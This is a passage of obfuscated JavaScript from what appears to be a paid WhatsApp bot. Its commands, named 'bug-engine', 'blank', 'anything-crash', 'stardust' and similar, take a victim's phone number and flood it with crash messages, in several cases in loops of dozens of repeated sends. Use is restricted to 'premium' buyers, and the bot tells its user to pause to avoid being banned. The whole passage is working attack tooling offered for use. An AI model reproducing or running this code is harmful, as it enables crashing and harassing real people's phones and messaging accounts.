            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0xfd13c = q.replace(/[^0-9]/g, '');
          if (_0xfd13c.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x1c092c = _0xfd13c + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0xdc1c19 = 0x0; _0xdc1c19 < 0x32; _0xdc1c19++) {
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
            await _0x4b4561(_0x1c092c, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0xfd13c + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "bug-engine":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x1918c2 = _0x1b3c99.split(',')[0x0];
          let _0x47573a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x1918c2 || !_0x47573a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x47573a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0xeec3be = _0x1918c2.replace(/[^0-9]/g, '');
          let _0x298ba3 = '' + encodeURI(_0x47573a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0xeec3be + "@s.whatsapp.net");
          let _0x144bc2 = _0xeec3be + '@s.whatsapp.net';
          if (_0xeec3be == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x144bc2, _0x298ba3);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x144bc2.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x144bc2]);
        }
        break;
      case "blank":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5b1fc1 = _0x1b3c99.split(',')[0x0];
          let _0x4e0f47 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5b1fc1 || !_0x4e0f47) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4e0f47))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x516700 = _0x5b1fc1.replace(/[^0-9]/g, '');
          let _0x45ea26 = '' + encodeURI(_0x4e0f47);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x516700 + "@s.whatsapp.net");
          let _0x4bc777 = _0x516700 + "@s.whatsapp.net";
          if (_0x516700 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4bc777, _0x45ea26);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4bc777.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4bc777]);
        }
        break;
      case 'blank-dark':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x4caf43 = _0x1b3c99.split(',')[0x0];
          let _0x2e1d80 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x4caf43 || !_0x2e1d80) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x2e1d80))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x37cd76 = _0x4caf43.replace(/[^0-9]/g, '');
          let _0x23db83 = '' + encodeURI(_0x2e1d80);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x37cd76 + '@s.whatsapp.net');
          let _0x23b91b = _0x37cd76 + "@s.whatsapp.net";
          if (_0x37cd76 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x23b91b, _0x23db83);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x23b91b.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x23b91b]);
        }
        break;
      case 'eror-bug':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x377576 = _0x1b3c99.split(',')[0x0];
          let _0x361468 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x377576 || !_0x361468) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x361468))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x11b28d = _0x377576.replace(/[^0-9]/g, '');
          let _0x3c0134 = '' + encodeURI(_0x361468);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x11b28d + "@s.whatsapp.net");
          let _0x3f7658 = _0x11b28d + "@s.whatsapp.net";
          if (_0x11b28d == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3f7658, _0x3c0134);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3f7658.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3f7658]);
        }
        break;
      case "walking-bug":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x522218 = _0x1b3c99.split(',')[0x0];
          let _0x11cceb = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x522218 || !_0x11cceb) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x11cceb))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x13f7f4 = _0x522218.replace(/[^0-9]/g, '');
          let _0xb1493e = '' + encodeURI(_0x11cceb);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x13f7f4 + '@s.whatsapp.net');
          let _0x90b826 = _0x13f7f4 + "@s.whatsapp.net";
          if (_0x13f7f4 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x90b826, _0xb1493e);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x90b826.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x90b826]);
        }
        break;
      case "anything-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x3e223b = _0x1b3c99.split(',')[0x0];
          let _0x4d40a4 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x3e223b || !_0x4d40a4) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x4d40a4))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4cf58a = _0x3e223b.replace(/[^0-9]/g, '');
          let _0xdd22e2 = '' + encodeURI(_0x4d40a4);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4cf58a + "@s.whatsapp.net");
          let _0x366e60 = _0x4cf58a + "@s.whatsapp.net";
          if (_0x4cf58a == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x366e60, _0xdd22e2);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x366e60.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x366e60]);
        }
        break;
      case "blank-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x2ce478 = _0x1b3c99.split(',')[0x0];
          let _0x2239c5 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x2ce478 || !_0x2239c5) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x2239c5))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x228336 = _0x2ce478.replace(/[^0-9]/g, '');
          let _0x26918b = '' + encodeURI(_0x2239c5);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x228336 + "@s.whatsapp.net");
          let _0x3ef2e9 = _0x228336 + "@s.whatsapp.net";
          if (_0x228336 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x3ef2e9, _0x26918b);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x3ef2e9.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x3ef2e9]);
        }
        break;
      case "engine-ui":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5b1382 = _0x1b3c99.split(',')[0x0];
          let _0x5b2293 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5b1382 || !_0x5b2293) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x5b2293))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x202c5b = _0x5b1382.replace(/[^0-9]/g, '');
          let _0x433fde = '' + encodeURI(_0x5b2293);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x202c5b + "@s.whatsapp.net");
          let _0x4d61eb = _0x202c5b + "@s.whatsapp.net";
          if (_0x202c5b == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4d61eb, _0x433fde);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4d61eb.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4d61eb]);
        }
        break;
      case 'engine-external':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x363700 = _0x1b3c99.split(',')[0x0];
          let _0x289c46 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x363700 || !_0x289c46) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x289c46))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4935b3 = _0x363700.replace(/[^0-9]/g, '');
          let _0x45d5fa = '' + encodeURI(_0x289c46);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4935b3 + "@s.whatsapp.net");
          let _0x4d76b9 = _0x4935b3 + '@s.whatsapp.net';
          if (_0x4935b3 == '6283123456789') {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4d76b9, _0x45d5fa);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4d76b9.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4d76b9]);
        }
        break;
      case "engine-internal":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x5a803d = _0x1b3c99.split(',')[0x0];
          let _0x3b5d0a = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x5a803d || !_0x3b5d0a) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x3b5d0a))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x44a0ae = _0x5a803d.replace(/[^0-9]/g, '');
          let _0x42a00d = '' + encodeURI(_0x3b5d0a);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x44a0ae + "@s.whatsapp.net");
          let _0x4739bb = _0x44a0ae + '@s.whatsapp.net';
          if (_0x44a0ae == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4739bb, _0x42a00d);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4739bb.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4739bb]);
        }
        break;
      case "engine-crash":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!_0x1b3c99) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          let _0x3a3a72 = _0x1b3c99.split(',')[0x0];
          let _0x53b297 = _0x1b3c99.split(',')[0x1] * 0x5;
          if (!_0x3a3a72 || !_0x53b297) {
            return _0x5d98d9("Use " + (_0x1eabdf + _0x19c9fe) + " victim number|amount\nExample " + (_0x1eabdf + _0x19c9fe) + " 6283123456788,5");
          }
          if (isNaN(parseInt(_0x53b297))) {
            return _0x5d98d9("Amount must be a number");
          }
          let _0x4c8990 = _0x3a3a72.replace(/[^0-9]/g, '');
          let _0x218be8 = '' + encodeURI(_0x53b297);
          var _0x5cc0b6 = await _0x38dbed.onWhatsApp(_0x4c8990 + "@s.whatsapp.net");
          let _0x4229c1 = _0x4c8990 + '@s.whatsapp.net';
          if (_0x4c8990 == "6283123456789") {
            return;
          }
          if (_0x5cc0b6.length == 0x0) {
            return _0x5d98d9("The number is not registered on WhatsApp");
          }
          _0x5d98d9("please wait, " + _0x19c9fe + " bug is in process..");
          await sleep(0x7d0);
          _0x4099ba(_0x4229c1, _0x218be8);
          await sleep(0x9c4);
          _0x2562c6("Successfully Sent Bug To @" + _0x4229c1.split('@')[0x0] + " Using *" + _0x19c9fe + "*👾\n\nPause 2 minutes so that the bot is not banned.", [_0x4229c1]);
        }
        break;
      case "internal-quoted":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x39e076 = q.replace(/[^0-9]/g, '');
          if (_0x39e076.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x394d30 = _0x39e076 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x4c7918 = 0x0; _0x4c7918 < 0x32; _0x4c7918++) {
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
            await _0x4b4561(_0x394d30, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x39e076 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "external-quoted":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x4940e4 = q.replace(/[^0-9]/g, '');
          if (_0x4940e4.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5119ee = _0x4940e4 + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x35630b = 0x0; _0x35630b < 0x32; _0x35630b++) {
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
            await _0x4b4561(_0x5119ee, _0x44bc2a);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x4940e4 + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case "stardust":
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x32a6fc = q.replace(/[^0-9]/g, '');
          if (_0x32a6fc.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0x5ce4d1 = _0x32a6fc + "@s.whatsapp.net";
          await _0x5d98d9("_</> successfully send bug to target_");
          for (let _0x3131b2 = 0x0; _0x3131b2 < 0x28; _0x3131b2++) {
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
            await _0x4b4561(_0x5ce4d1, _0x600e6e);
          }
          await _0x5d98d9("<✓> Successfully Send Bug to " + _0x32a6fc + " Using " + _0x19c9fe + ". 彡\n\n<!> Pause 2 minutes so that the bot is not banned.");
        }
        break;
      case 'self':
        {
          if (!_0x215af5) {
            return _0x5d98d9(mess.only.owner);
          }
          _0x38dbed["public"] = false;
          _0x5d98d9('succes');
        }
        break;
      case 'public':
        {
          if (!_0x215af5) {
            return _0x5d98d9(mess.only.owner);
          }
          _0x38dbed['public'] = true;
          _0x5d98d9('succes');
        }
        break;
      case '🌷':
      case '💥':
        {
          if (!_0x210452) {
            return _0x5d98d9("khusus premium user, jika ingin premium beli ke owner dengan cara .owner");
          }
          if (!q) {
            return _0x5d98d9("Penggunaan ." + _0x19c9fe + " 6283123456789");
          }
          let _0x24daca = q.replace(/[^0-9]/g, '');
          if (_0x24daca.startsWith('0')) {
            return _0x5d98d9("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x19c9fe + " 6283123456789");
          }
          let _0xff3d66 = _0x24daca + "@s.whatsapp.net";
